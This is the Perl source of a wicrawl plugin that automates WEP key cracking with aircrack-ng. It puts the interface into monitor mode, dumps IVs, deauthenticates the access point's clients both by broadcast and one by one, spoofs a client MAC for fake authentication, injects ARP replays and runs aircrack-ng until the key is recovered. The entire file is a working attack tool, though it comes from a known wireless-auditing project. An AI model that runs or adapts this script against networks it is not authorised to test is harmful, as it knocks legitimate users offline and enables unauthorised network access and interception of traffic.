#!/usr/bin/perl -w
#
# This is a plugin that will try to crack wep with aircrack-ng.  It will spawn
# threads to handle:
#   - Setting interface up with airmon
#		- Dumping the IVs
#   - Running aireplay fake auth to get authenticated client
#		- Trying to inject ARP
#		- Actually doing the cracking
#
# http://midnightresearch.com/projects/wicrawl
#
# Plugin written by: Aaron Peterson 
#
# aircrack-ng written by:  These guys: http://aircrack-ng.org/
#                          The original code is by Christophe Devine
# 
# aircrack-ng availabile here: http://aircrack-ng.org/
# Thanks to those guys for doing all the hard work, =)

$|=1;
use strict;
use Getopt::Std;
use File::Basename;
use POSIX ":sys_wait_h";
use Fcntl;
$Getopt::Std::STANDARD_HELP_VERSION='1';

my $bssid=0; my $encryption=""; my $ssid=0; my $interface=0; my $nick=0; my $version=0; my $run=0;
our($opt_b, $opt_e, $opt_i, $opt_s, $opt_n, $opt_r, $opt_v);
getopts ("b:e:i:n:r:s:v:");

if(    (!defined $opt_b) || (!defined $opt_i)
    || (!defined $opt_n) || (!defined $opt_s)
    || (!defined $opt_v) || (!defined $opt_e)
    || (!defined $opt_r)) {
  print "  [!] usage $0 <options>\n";
  print "\t-b <bssid>\n";
  print "\t-e <encryption type>\n";
  print "\t-i <interface>\n";
  print "\t-n <nickname>\n";
  print "\t-s <ssid>\n";
  print "\t-r <run>\n";
  print "\t-v <version>\n";
  exit 1;
}

$bssid =      $opt_b if(defined $opt_b);
$encryption = $opt_e if(defined $opt_e);
$ssid =       $opt_s if(defined $opt_s);
$interface =  $opt_i if(defined $opt_i);
$nick =       $opt_n if(defined $opt_n);
$run =        $opt_r if(defined $opt_r);
$version =    $opt_v if(defined $opt_v);


my $pcapfile=$ENV{'WICRAWL_PCAPFILE'};
my $aircrackdir= "/usr/sbin";
my $aircrack=$aircrackdir . "/aircrack-ng";
my $airmon=$aircrackdir . "/airmon-ng";
my $aireplay=$aircrackdir . "/aireplay-ng";
my $airodump=$aircrackdir . "/airodump-ng";
my $deauth_all_clients=1;
my $deauth_only_once=1;
my $deauth_never=0;
my $starttime=time;
my $success=0;
# Don't change this, used as a constant.
my $no_wait_aircrack=2;
my $wepkey;
# number of seconds to wait between sending status messages
my $status_cycle=48;
# The client we will get and spoof for the entire process
my $spoof_client="";
# The last time a status message was sent
my $status_last=time;
# The number of IVs we found last status_cycle
my $ivs_last_cycle=0;
my $logfile="/dev/null";
my $deauth_retry=10;
my $forksleep=4;
my $base_ivsfile=`umask 077 && mktemp -q "/tmp/aircrack.XXXXXX" 2>/dev/null`;
my $ivsfile;
my $min_ivs=5000;
my $status_file;
chomp($base_ivsfile);
my $channel;
my $use_ptw=1;
my $fudge_factor;

# Debug level for now...
my $verbosity=2;

# Add execute privs if we don't have it already
if(( -f $airmon ) && ( ! -x $airmon )) {
	chmod "0755", $airmon;
}

if( ( ! -x $aircrack) || ( ! -x $airmon) || ( ! -x $airodump) || ( ! -x $aireplay) ) {
	print " [!!] An aircrack file is missing or not executable, looking for:\n";
	print "\t[$aircrack]\n";
	print "\t[$airmon]\n";
	print "\t[$airodump]\n";
	print "\t[$aireplay]\n";
	print " Exiting now..\n";
	exit 1;
}

# keep track of these so we can clean up as needed
my %pids=(
          "dump" => 0,
          "crack" => 0,
          "inject" => 0,
          "deauth" => 0,
          "fakeauth" => 0
         );

#######################################################################
# function wait_children - cleans up after the kids.
#   Arugments:  0 to cleanup children (but not blocking wait), 
#               1 to kill children, and make sure their gone.
#               2 to wait on all children except aircrack
#                 (in some cases we want it to clean up after itself).
#   Returns: 0
#####################
sub wait_children {
  my $iskill=shift(@_);

	if($iskill eq "CHLD") {
		lprint(0,3, "Received SIGCHLD, checking the forked children\n");
		$iskill=0;
	}

	if(!defined($iskill)) {
		$iskill=0;
	}

  my $kid; my $pid;

  foreach my $key (keys %pids) {
    $pid=$pids{$key};

		# Don't wait on aircrack if we don't want to
		next if (($key eq "crack") && ($iskill == 2));

    # no child
    next if ($pid <= 0);

    if($iskill!=1) {

			# Don't block
      $kid=waitpid($pid, WNOHANG);

			if($kid > 0 ) {
				lprint(0,2, "Child [$key] pid [$pid] finished. (wait returned [$kid])\n");
				$pids{"$key"}=0;
			}
    } else {
      lprint(0, 2, "Killing child [$key] pid [$pid]\n");
      kill_pid($pid);
			$pids{$key}=0;
    }

  }

  return 0;
}
#######################################################################
# function kill_pid - kill the given pid.
#   Arguments:  pid
####################
sub kill_pid {
  my $child=shift(@_);

  my $have_child=1;
  my $count=0;

	# this is what the pgroup is set to
	$child="-" . $child;
  while($have_child) {
    my $kid=waitpid($child, WNOHANG);
    last if($kid > 0);

    kill(2, $child);
    sleep 1;
		$count++;
		if($count>=3) {
			lprint(1,2, "Child [$child] not dying, killing with force..\n");
			kill(9, $child);
			last;
		}
  }

	lprint(0, 2, "Child [$child] was killed\n");

  return 0;
}
#######################################################################
# function lprint - log print function
#   Arugments: type of message (int), loglevel (int), string of $msg
#   Returns: 0
#   Notes:
#     Loglevels are:
#       0 = Errors and fatal  (Always shown, -q for quiet)
#       1 = Default logging   (default log level)
#       2 = More info         (-v)
#       3 = All info          (-vv)
#     Message Types are:
#       0 = Info
#       1 = Notice
#       2 = Error
####################
sub lprint {
  my $type=shift(@_);
  my $loglevel=shift(@_);
  my $msg=shift(@_);
  my $chr="-";

  # set the prefix character: '!' is err, '*' is notice
  if ($type==1) {
    $chr="*";
  } elsif ($type==2) {
    $chr="!";
  }

  # generate the prefix chars
  my $num=($loglevel==3) ? 2 : $loglevel;
  $chr=" "x$num . "[" . "$chr"x(3-$num) . "]";

  # print if loglevel is high enough
  if($loglevel <= $verbosity) {
    $msg="$chr $msg";
    print $msg;
  }

  # log everything
  open(LOG, ">>$logfile") || die "  [!!!] Can't open logfile $logfile\n";
  print LOG $msg;
  close(LOG) || die "  [!!!] Can't close logfile $logfile\n";

  return 0;
}
#######################################################################
# function cleanup - run to cleanup on sigint, etc
####################
sub cleanup() {
	my $msg = shift(@_);

	if((defined($msg)) && ($msg eq "INT")) {
		lprint(2, 1, "Process [$$] received interrupt, cleaning up\n");
	} else {
		lprint(2, 1, "Process [$$] was told to clean up\n");
	}

  wait_children(1);
  #unlink($ivsfile);
  lprint(1, 1, "Aircrack wicrawl plugin done.\n");
  exit 0;

}
##########################################################
# function get_num_ivs
##########################################################
sub get_num_ivs {
	my $status_file=shift(@_);
	my $ivs=0;

	if(! -r $status_file) {
		lprint(2,2, "Can't open airodump status file [$status_file] to get IVs\n");
		return 0;
	}

	# Try to see how many IVs we've gotten so far...
	open(STATUS, "<$status_file") || warn "  [!] Can't open the airodump status file [$status_file] to get IVs\n"; 
	foreach my $line (<STATUS>) {
		$line =~ s/^[\s]*(.*?)[\s]*$/$1/;
		next if($line eq "");

		# parsing the CSV output to see how many IVs we have so far
		if($line =~ m/^$bssid,(.*?,){9}(.*?),.*$/i) {
			$ivs=$2;
			# Strip spaces
			$ivs =~ s/^[\s]*(.*?)[\s]*$/$1/;
		}

		last if($ivs!=0);
	}

	return($ivs);

}
##########################################################
# function get_all_clients
##########################################################
sub get_all_clients {
	my $status_file=shift(@_);
	my @clients;

	if(! -r $status_file) {
		lprint(2,2, "Can't open airodump status file [$status_file] to find a client\n");
		return 0;
	}

	# Try to find a client..
	open(STATUS, "<$status_file") || warn " [!] Can't open the airodump status file [$status_file] to find a client\n"; 
	# This tells us whether we are in the clients section of the status file yet.
	my $inclients=0;

	foreach my $line (<STATUS>) {
		my $tmp_client_mac="";

		# strip whitespace
		$line =~ s/^[\s]*(.*?)[\s]*$/$1/;

		# Set $inclients when we're in that section of the file
		# otherwise, skip to the next line
		if(($inclients==0) && ($line=~m/^Station MAC/)) {
			$inclients=1;
			# We want to skip to the next line anyway since this one is the header
			next;
		} elsif ($inclients==0) {
			next;
		}
		next if($line eq "");

		# parsing the CSV output to grab the clients
		if($line =~ m/^(.*?),(.*?,){3}(.*?),[\s]+.*$/i) {
			$tmp_client_mac=$1;
			$tmp_client_mac =~ s/^[\s]*(.*?)[\s]*$/$1/;
			push(@clients, $tmp_client_mac);
		}
	}

	return(@clients);

}
##########################################################
# function get_client
##########################################################
sub get_client {
	my $status_file=shift(@_);
	my $client_mac="";
	my $last_packets=0;

	if(! -r $status_file) {
		lprint(2,2, "Can't open airodump status file [$status_file] to find a client\n");
		return 0;
	}

	# Try to find a client..
	open(STATUS, "<$status_file") || warn " [!] Can't open the airodump status file [$status_file] to find a client\n"; 
	# This tells us whether we are in the clients section of the status file yet.
	my $inclients=0;

	foreach my $line (<STATUS>) {
		my $tmp_client_mac="";
		my $packets=0;

		# strip whitespace
		$line =~ s/^[\s]*(.*?)[\s]*$/$1/;

		# Set $inclients when we're in that section of the file
		# otherwise, skip to the next line
		if(($inclients==0) && ($line=~m/^Station MAC/)) {
			$inclients=1;
		} elsif ($inclients==0) {
			next;
		}
		next if($line eq "");

		# parsing the CSV output to grab the clients
		if($line =~ m/^(.*?),(.*?,){3}(.*?),[\s]+$bssid.*$/i) {
			$tmp_client_mac=$1;
			$packets=$3;
			$tmp_client_mac =~ s/^[\s]*(.*?)[\s]*$/$1/;
			$packets =~ s/^[\s]*(.*?)[\s]*$/$1/;
		}

		# Set the client_mac to be the one with the most packets
		# Hopefully this means we have the best chance of being 
		# authenticated already
		if(($tmp_client_mac ne "") && ($packets > $last_packets)) {
			$client_mac=$tmp_client_mac;
			$last_packets=$packets;
		}
	}

	return($client_mac);

}
##########################################################
# function print_status
# uses global status_cycle, status_last, starttime
##########################################################
sub print_status {
	my $ivs=shift(@_);
	my $ivs_estimate;
	my $ivs_last_cycle_avg;

	if($use_ptw==1) {
		$ivs_estimate=20000;
	} else {
		$ivs_estimate=500000;
	}
	
	# Only print out every status_cycle seconds
	return 0 if((time - $status_last) < $status_cycle);
	# If we don't have any IVs, we don't need to report status
	return 0 if($ivs==0);
	$ivs_last_cycle=$ivs - $ivs_last_cycle;

	my $total_time=time - $starttime;
	$total_time=1 if ($total_time == 0); 

	my $iv_rate=$ivs / $total_time;
	$iv_rate=1 if ($iv_rate == 0); 

	my $finish_hours=$ivs_estimate / $iv_rate / 3600;
	$ivs_last_cycle_avg=$ivs_last_cycle / $status_cycle;

	# Just to decimal places if needed.
	$finish_hours=~s/^([\d]+\...).*$/$1/;
	$iv_rate=~s/^([\d]+\...).*$/$1/;
	$ivs_last_cycle_avg=~s/^([\d]+\...).*$/$1/;

	
	lprint(0,1, "[$iv_rate] IVs/sec avg total ([$ivs_last_cycle_avg] last cycle), [$finish_hours] hours to get [$ivs_estimate] IVs\n");

	$ivs_last_cycle=$ivs;
	$status_last=time;

	return 0;
	
}
############################################################
# function check_reschedule
############################################################
sub check_reschedule() {

	foreach my $key (keys %pids) {
		if($pids{"$key"}==0) {

			# These are really the only two threads we could
			# restart without consequences...
			start_fakeauth()  if($key eq "fakeauth");
			start_injection() if($key eq "inject");
		}
	}

	return 0;
}
############################################################
# function start_airodump
############################################################
sub start_airodump() {

	my $pid;
	if(($pid=fork) > 0) {
		# is parent -- We'll fork and (almost) forget this one

		lprint(1,1, "Spawned IV dumping process [$pid] from parent [$$]\n");
		$pids{"dump"}=$pid;

	} elsif($pid==0) {
		# is child

		# reset signal handler
		$SIG{'INT'} = 'DEFAULT';
		
		my $use_ivs="--ivs";
		if($use_ptw == 1) {
			$use_ivs="";
		}

		my $system="$airodump $use_ivs $channel -w $base_ivsfile $interface >/dev/null 2>&1";
		lprint(0,1, "Airodump child running:\n\t[$system]\n");

		# Reset the process group so that when the child sends a TERM
		# to the whole group, the parent doesn't die...
		setpgrp($$, $$) || die " [!!] Can't set process group for [$$]\n";

		# Make sure it doesn't kill the child thread too
		$SIG{'TERM'}='IGNORE';

		# Don't care about the output, we just want it not to fail
		`$system`;
		my $rc=$? >> 8;

		$SIG{'TERM'}='DEFAULT';


		if($rc != 0) {
			lprint(2, 0, "Running [$airodump] on interface [$interface] failed\n");
			exit 1;
		} else {
			exit 0;
		}

		exit 0;

	} else {
		lprint(2,1, "Airodump fork failed..\n");
		exit 1;
	}

	lprint(1,2, "Sleeping [$forksleep] seconds to let monitoring process start\n");
	sleep $forksleep;

	return 0;
}
############################################################
# function start_fakeauth
############################################################
sub start_fakeauth() {
	my $pid;

	# Get the best client to spoof	
	if($spoof_client eq "") {

		# This means we've never had a valid client before.
		# Block until we can get a client to spoof
		my $count=0;
		while($spoof_client eq "") {
			$spoof_client=get_client($status_file);
			if($spoof_client eq "") {
				lprint(1,2, "Haven't found a client yet on [$ssid], waiting for [$forksleep] sec\n");
			}

			# If things aren't happening fast enough, we'll try deauthing people..
			if (($deauth_only_once!=1) && ($count % $deauth_retry) == 0) {
				lprint(1,2, "Looks like we can't find a client, we'll try re-de-auth'ing them, :)\n");
				start_deauth();
			}

			sleep $forksleep;
			$count++;
		}

	} else {

		# If the client is already set, make sure to check to see if
		# there is a better client to spoof (ie. more packets).  If there is
		# then we switch to that client instead.  If there is nothing better then
		# we don't have to restart injection (just continue with fake auth)
		my $new_spoof_client=get_client($status_file);
		if($new_spoof_client ne $spoof_client) {
			lprint(1,1, "Found better client to arp inject [$new_spoof_client] instead of [$spoof_client]\n"); 
			kill_pid($pids{"inject"});
			$spoof_client=$new_spoof_client;
			start_injection();
		} else {
			lprint(0,3, "DEBUG: Not restarting injection, [$spoof_client] is still the best client\n");
		}
	}

	if(($pid=fork) > 0) {
		# This is the parent -- We'll fork and (almost) forget this one

		lprint(1,1, "Spawned aireplay fake auth process [$pid] from parent [$$]\n");
		$pids{"fakeauth"}=$pid;

	} elsif($pid==0) {
		# is child

		# reset signal handler
		$SIG{'INT'} = 'DEFAULT';

		#####################################################
		# Start the client up
		#####################################################
		my $system="$aireplay -b $bssid -a $bssid -i $interface --fakeauth 30 -e $ssid -h $spoof_client $interface 2>&1";
		lprint(0,1, "Aireplay fakeauth child running:\n\t[$system]\n");

		# Reset the process group so that when the child sends a TERM
		# to the whole group, the parent doesn't die...
		setpgrp($$, $$) || die " [!!] Can't set process group for [$$]\n";

		# Make sure it doesn't kill the child thread too
		$SIG{'TERM'}='IGNORE';

		my $lastmsg=time;
		open(INJECT, "$system |") || warn "  [!] Can't start aireplay [$aireplay]\n";
		while(readline(INJECT)) {
			my $line=$_;
			chomp($line);
			if($line =~ m/Association successful/) {
				lprint(1,1, "FAKEAUTH: Successful Association!!! Hopefully Arp injection should work\n");
			}

			if($line =~ m/Got a disassociation packet/) {
				lprint(1,1, "FAKEAUTH: Warning: We are getting de-auth packets from the AP, \n\tthis means arp injection may not be working\n");
			}

			if($line =~ m/Attack was unsuccessful/) {
				lprint(1,1, "FAKEAUTH: Warning: Fake auth attack failed, we will try again...\n");
			}
		}

		close(INJECT);

		$SIG{'TERM'}='DEFAULT';

		exit 0;

	} else {
		lprint(2,1, "Aireplay fake auth fork failed..\n");
		exit 1;
	}

	return 0;
}

#################################################################
# function start_injection: aireplay injection child
#################################################################
sub start_injection() {

	my $pid;
	if(($pid=fork) > 0) {
		# is parent -- We'll fork and (almost) forget this one

		lprint(1,1, "Spawned aireplay arp injection process [$pid] from parent [$$]\n");
		$pids{"inject"}=$pid;

	} elsif($pid==0) {
		# is child

		# reset signal handler
		$SIG{'INT'} = 'DEFAULT';

		my $system="$aireplay -b $bssid -a $bssid -x 64 -i $interface --arpreplay -h $spoof_client $interface 2>&1";
		lprint(0,1, "Aireplay child running:\n\t[$system]\n");

		# Reset the process group so that when the child sends a TERM
		# to the whole group, the parent doesn't die...
		setpgrp($$, $$) || die " [!!] Can't set process group for [$$]\n";

		# Make sure it doesn't kill the child thread too
		$SIG{'TERM'}='IGNORE';

		$/="";

		my $lastmsg=time;
		my $count=0;
		open(INJECT, "$system |") || warn " [!] Can't start aireplay [$aireplay]\n";
		while(readline(INJECT)) {
			my $line=$_;
			if($line =~ m/doesn't match the specified MAC/) {
				lprint(1,1, "Warning: It doesn't look like MAC spoofing is working, this means arp injection may fail\n");
			}

			if($line =~ m/got a deauth\/disassoc packet/) {
				lprint(1,1, "Warning: We are getting de-auth packets from the AP, this means arp injection may not be working\n");
			}

			# Need to print out how the injection is going...
			if($line =~ m/.*Read.*packets.*\(got\s(\d+).*sent.*packets/) {
				my $arp_num=$1;
				chomp($line);
				
				# We only want to send messages once every sleep cycle
				if((time-$lastmsg) > $forksleep) {
					lprint(1,1, "AIREPLAY: [$line]\n");
					$lastmsg=time;

					# if things are running too slowly, we'll try to kick them off here...
					if(($deauth_only_once!=1) && ($arp_num ne "") && ($arp_num < 20) && (($count % $deauth_retry) == 0)) {
						lprint(1,2, "Looks like we can't enough ARP, we'll try re-de-auth'ing :)\n");
						start_deauth();
					}
					$count++;
				}
			}
		}

		close(INJECT) || warn " [!] Can't close aireplay injection [$aireplay]\n";

		my $rc=$? >> 8;

		$SIG{'TERM'}='DEFAULT';

		if($rc != 0) {
			lprint(2, 0, "Running [$aireplay] injection on interface [$interface] failed\n\t(warn: $!)\n");
			exit 1;
		} else {
			exit 0;
		}

		exit 0;

	} else {
		lprint(2,1, "Aireplay injection fork failed..\n");
		exit 1;
	}
	
	return 0;
}

#################################################################
# function start_deauth: aireplay de-auth child
#################################################################
sub start_deauth() {

	if($deauth_never==1) {
		lprint(0,2, "Configured never to deauth children... not deauthing..\n");
		return 0;
	}

	my $pid;
	if(($pid=fork) > 0) {
		# is parent -- We'll fork and (almost) forget this one

		lprint(1,1, "Spawned aireplay de-auth process [$pid] from parent [$$]\n");
		$pids{"deauth"}=$pid;

	} elsif($pid==0) {
		# is child

		# reset signal handler
		$SIG{'INT'} = 'DEFAULT';

		my $system="$aireplay -a $bssid -i $interface --deauth 5 $interface 2>&1";
		lprint(0,1, "Aireplay child running:\n\t[$system]\n");

		# Reset the process group so that when the child sends a TERM
		# to the whole group, the parent doesn't die...
		setpgrp($$, $$) || die " [!!] Can't set process group for [$$]\n";

		# Make sure it doesn't kill the child thread too
		$SIG{'TERM'}='IGNORE';

		lprint(0,1, "Sending de-auth to broadcast...\n");
		# We don't really care about the output as long as it's successful
		`$system`;

		my $rc=$? >> 8;

		if($rc != 0) {
			lprint(2,2, "Looks like broadcast de-authentication had a problem running...\n");
		}

		# Grab all clients we can see...
		my @clients=get_all_clients($status_file);

		my $client_list="";
		if(($deauth_all_clients==1) && (@clients)) {
			lprint(0,1, "Sending de-auth to each client individually...\n");

			foreach my $client (@clients) {
				$client_list.="[$client] ";

				my $system="$aireplay -a $bssid -i $interface -c $client --deauth 5 $interface 2>&1";
				# We don't really care about the output as long as it's successful
				`$system`;

				$rc=$? >> 8;

				if($rc != 0) {
					lprint(2, 0, "Running [$aireplay] targeted --deauth failed\n");
				}
			}
			lprint(1,1, "De-authed clients: $client_list\n");
		}

		$SIG{'TERM'}='DEFAULT';

		exit 0;

	} else {
		lprint(2,1, "Aireplay --deauth fork failed..\n");
		exit 1;
	}
	
	return 0;
}


##########################################################
# function start_aircrack
##########################################################
sub start_aircrack() {

	my $pid;
	# open pipe so the child can talk to the parent. We need to do this so that we can
	# have the parent process give the final output, return code and accounting, etc
	pipe(PARENT_RDR, CHILD_WTR);

	# Get flags
	my $flags=fcntl(PARENT_RDR, F_GETFL, 0);

	# Add nonblock flag
	$flags |= O_NONBLOCK;

	# Set flags
	fcntl(PARENT_RDR, F_SETFL, $flags);

	lprint(0, 2, "Waiting a few seconds for injection and dumping to spin up...\n");
	sleep 5;

	my $num_ivs=get_num_ivs($status_file);
	while($num_ivs < $min_ivs) {
		lprint(1,1, "AIRCRACK: Not enough IVs ([$num_ivs] of [$min_ivs] min), waiting [$forksleep] sec for more\n");
		print_status($num_ivs);

		# Clean up, and see if we need to re-run anything
		wait_children(0);
		check_reschedule();

		sleep $forksleep;
		$num_ivs=get_num_ivs($status_file);	
	}

	lprint(1,1, "Starting aircrack now, this might take a bit...\n");

	####################################################################
	# We're not going to stop this thread until we have a wep key!!
	####################################################################
	while($success == 0) {
		# Create aircrack child
		if(($pid=fork) > 0) {
			# is parent
			
			lprint(1,2, "Spawned aircrack process [$pid] from parent [$$]\n");
			$pids{"crack"}=$pid;

			sleep 1;
			$wepkey="";

			####################################################################
			# We need an inner loop here to wait for a wepkey
			# only exit if we know we either failed, or have a key.
      # If we do exit here from anything but finding a wepkey,
			# we'll be restarting the cracking thread (this means aircrack 
			# should have failed and is dead and gone.
			####################################################################
			while($wepkey eq ""){

				my $kid=waitpid($pid, WNOHANG);

				my $line;
				if($kid >= 0) {
					# This means the process is either still running, or has finished running
					while(<PARENT_RDR>) {
						
						my $line=$_;

						# We are non-blocking so just skip out if we're not getting anything.
						last if(!defined($line));
						next if($line eq "");
						
						if(($line =~ m/FAILED/i) || ($line eq "-1")) {
							lprint(2, 1, "Child WEP Cracker [$pid] failed... message: [$line].\n");
							lprint(2, 1, "Will try again, this might take a few tries to get enough packets...\n");
							$wepkey="Failed";

						} elsif ($line =~ m/(\w\w:)+\w\w/) {
							lprint(1, 1, "Child WEP Cracker [$pid] found WEP key!!!! [$line]\n");
							$wepkey=$line;
							$success=1;
							last;

						} else {
							lprint(1,1, "Unknown message from wep cracking client [$line]\n");
							$wepkey="";
						}
						last if ($success==1);

					}

					# exit the while loop looking for a wepkey
					last if ($success==1);

					# This means we're still running so we want to check to see how many IVs we have so far...
					my $ivs=get_num_ivs($status_file);
					lprint(1,1, "Aircrack child [$pid] still running, Collected [$ivs] IVs so far...\n");

				} elsif ($kid == -1) {
					# Process previously died, and we didn't get output from it...

					lprint(2, 2, "Child WEP Cracker [$pid] was killed\n");
					$wepkey="Failed";
				}


				# Clean up, and see if we need to re-run anything
				wait_children($no_wait_aircrack);
				check_reschedule();

				# since the process is finished, we need to restart it. This will exit the while loop
				last if ($kid>0);

				sleep 10 if($wepkey eq "");
			}

		} elsif($pid==0) {
			# is forked child

			my $msg;
			my $extra_opts="";

			if($use_ptw==1) {
				$extra_opts.=" -z";
			}

			my $system="$aircrack -q -f $fudge_factor -b $bssid -a 1 $ivsfile $extra_opts 2>&1";
			lprint(0,1, "Aircrack child running:\n\t[$system]\n");

			# Reset the process group so that when the child sends a TERM
			# to the whole group, the parent doesn't die...
			setpgrp($$, $$) || die " [!!] Can't set process group for [$$]\n";

			# Make sure it doesn't kill the child thread too
			$SIG{'TERM'}='IGNORE';
			$SIG{'QUIT'}='IGNORE';

			open(CRACK, "$system |") || die "  [!] Can't open aircrack process [$system]\n";

			foreach my $line (<CRACK>) {
				chomp($line);
				$msg="";

				# Some of the common messages...
				if($line =~ m/KEY FOUND![\s]+\[[\s]*(.*?)[\s]*\].*$/) {
					$msg=$1;
					# if this occurs, this is all we really care about

				} elsif($line =~ m/Not enough IVs available/) {
					$msg="FAILED: Not enough IVs available";

				} elsif($line =~ m/No networks found/) {
					$msg="FAILED: No appropriate networks found";

				} elsif($line =~ m/failed/i) {
					$msg="FAILED: Unknown failure message";
					lprint(1,1, "Aircrack failed, output was [$line]\n");
				}

				chomp($msg);

				# Tell the parent what we've been up to.  We have to do this because
				# we want the parent process to do the final report/accounting, etc.
				print CHILD_WTR $msg if($msg ne "");
			}
				
			$SIG{'TERM'}='DEFAULT';
			$SIG{'QUIT'}='DEFAULT';

			my $rc=$? >> 8;

			if ($rc != 0) {
				lprint(2,1, "Aircrack failed to run, return code was [$rc]...\n\t(warn: $!)\n");
			} 
			
			exit 0;

		} else {
			lprint(2,1, "Aircrack fork failed..\n");
			exit 1;
		}

		sleep 1 if($success==0);
	}

	return 0;
}
##########################################################
# End functions
##########################################################

##########################################################
# Start a bunch of init stuff
##########################################################

$SIG{'INT'}= \&cleanup;
#$SIG{CHLD} = \&wait_children;

# Get the channel from the environment
if(defined($ENV{'WICRAWL_CHANNEL'})) {
	$channel=$ENV{'WICRAWL_CHANNEL'};
}
if($channel !~ m/^[\d]+$/) {
	lprint(0,1, "Channel [$channel] is not valid, will not set channel\n");
	$channel="";
} else {
	# Set this like this so we can just use $channel directly in calling airodump
	$channel="--channel $channel";
}

if(defined($ENV{'aircrack_use_ptw_attack'})) {
	$use_ptw=$ENV{'aircrack_use_ptw_attack'};
	if($use_ptw=~m/yes/i) {
		$use_ptw=1;
	} elsif ($use_ptw=~m/no/i) {
		$use_ptw=0;
	}
}

# Should be set from the config, otherwise default to true
if(defined($ENV{'aircrack_deauth_all_clients'})) {
	$deauth_all_clients=$ENV{'aircrack_deauth_all_clients'};
	if($deauth_all_clients=~m/yes/i) {
		$deauth_all_clients=1;
	} elsif ($deauth_all_clients=~m/no/i) {
		$deauth_all_clients=0;
	}
} 

# Should be set from the config
if(defined($ENV{'aircrack_deauth_only_once'})) {
	$deauth_only_once=$ENV{'aircrack_deauth_only_once'};
	if($deauth_only_once=~m/yes/i) {
		$deauth_only_once=1;
	} elsif ($deauth_only_once=~m/no/i) {
		$deauth_only_once=0;
	}
} 

# Should be set from the config
if(defined($ENV{'aircrack_deauth_never'})) {
	$deauth_never=$ENV{'aircrack_deauth_never'};
	if($deauth_never=~m/yes/i) {
		$deauth_never=1;
	} elsif ($deauth_never=~m/no/i) {
		$deauth_never=0;
	}
} 

if(defined($ENV{'aircrack_fudge_factor'})) {
	$fudge_factor=$ENV{'aircrack_fudge_factor'};
} else {
	$fudge_factor=6;
}

lprint(1,1, "Aircrack WEP cracking pluging starting...\n");

# TODOTODO make signal handler

# Set in monitor mode:
lprint(1,1, "Puting interface [$interface] in monitor mode\n");
`$airmon start $interface 2>/dev/null`;
my $rc=$? >> 8;

if($rc != 0) {
	lprint(2, 0, "Monitor mode enabling failed for aircrack plugin\n\t(warn: $!)\n");
	exit 1;
}

# We can use this to see how many IVs we are getting.
$status_file=$base_ivsfile . "-01.txt";

lprint(1,2, "Using status file [$status_file]\n");

# Apparently, this is what aircrack sticks on the end of filename you pass it.
# Our filenames should be random enough not to collide.  From here on out, this
# is how we refer to it
if($use_ptw != 1) {
	$ivsfile = $base_ivsfile . "-01.ivs";
} else {
	$ivsfile = $base_ivsfile . "-01.cap";
}

##########################################################
# Start main
##########################################################

# This should only get run once
start_airodump();

# This should help get some clients for airodump, :)
start_deauth();

# These may die, and get restarted by check_reschedule()
# which is probably started in the main thread in aircrack
start_fakeauth();
start_injection();

# The main process will continue execution in this function until
# we are successful in cracking wep
start_aircrack();


##########################################################
# Cleanup, etc
##########################################################

my $runtime=(time - $starttime) / 60;

if($success==1) {
	# pretty fireworks
	lprint(1,1, "---------------------------------------------------------------------------------------\n");
	lprint(1,1, "!!! *** !!! *** !!! *** !!! *** !!! *** !!! *** !!! *** !!! *** !!! *** !!! *** !!! ***\n");
	lprint(1,1, "!!! Wicrawl aircrack plugin successfully cracked [$ssid], key is [$wepkey]\n");
	lprint(1,1, "!!! Runtime was [$runtime] minutes\n");
	lprint(1,1, "!!! *** !!! *** !!! *** !!! *** !!! *** !!! *** !!! *** !!! *** !!! *** !!! *** !!! ***\n");
	lprint(1,1, "---------------------------------------------------------------------------------------\n");
	cleanup();
	exit 8;
} else {
	lprint(2,1, "Aircrack failed to crack [$ssid]. Runtime was [$runtime] minutes. Done.\n");
	cleanup();
	exit 1;
}


# TODOTODO Need to actually associate now...

exit 0;

# vim:ts=2:sw=2:sts=0:si:ai
